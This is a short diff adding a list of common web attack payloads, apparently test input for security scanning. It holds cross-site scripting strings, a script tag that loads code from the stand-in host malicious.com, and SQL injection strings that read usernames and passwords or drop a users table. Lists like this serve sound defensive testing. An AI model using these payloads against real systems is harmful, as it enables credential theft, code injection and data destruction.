@@ -1,0 +1,8 @@
+<script>alert('XSS')</script>
+' OR '1'='1'; --
+"><img src=x onerror=alert('XSS')>
+<!-- Comment -->
+' UNION SELECT username, password FROM users; --
+<script src=http://malicious.com/xss.js></script>
+'; DROP TABLE users; --
+<svg onload=alert('XSS')>
